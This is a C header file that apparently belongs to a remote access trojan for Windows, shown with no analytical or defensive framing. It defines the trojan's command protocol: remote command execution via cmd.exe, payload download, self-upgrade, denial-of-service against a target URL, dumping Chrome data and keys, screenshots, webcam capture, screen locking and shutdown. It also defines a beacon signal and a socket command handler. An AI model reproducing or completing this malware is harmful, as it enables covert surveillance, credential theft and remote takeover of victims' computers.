#define RAT_COMMAND_SYSINFO			"<!sysinfo>@"		//no args
#define RAT_COMMAND_DOWNLOAD		"<!download>@"		//download url f24df9773ad067709ccb40ff0bc90fa27a5fd3a20655a587ce2e41bd7c777165 
#define RAT_COMMAND_INITDOS			"<!initdos>@"		//target url
#define RAT_COMMAND_EXEC			"<!exec>@"			//execute command with cmd.exe
#define RAT_COMMAND_UPGRADE			"<!upgrade>@"		//upgrade to latest version 
#define RAT_COMMAND_DUMPCHROME		"<!dumpchrome>@"	//no args 
#define RAT_COMMAND_DUMPKEYS		"<!dumpkeys>@"		//no args
#define RAT_COMMAND_LOCK			"<!lock>@"			//no args
#define RAT_COMMAND_SCREENSHOT		"<!screenshot>@"	//no args
#define RAT_COMMAND_WEBCAM			"<!webcam>@"		//no args
#define RAT_COMMAND_SHUTDOWN		"<!shutdown>@"		//no args
#define RAT_COMMAND_MESSAGE			"<!message>@"		//text to display

  ///////////////////////////////////////////////////////////////
 //////////////////////Communications///////////////////////////
///////////////////////////////////////////////////////////////

#define RAT_SIGNAL_BECON			"<!HELLO>@" //specify host id for verification 



#include <Windows.h>
#include <winsock.h>

int HandleCommand(char*data,SOCKET s); //parse the command and send response to specified socket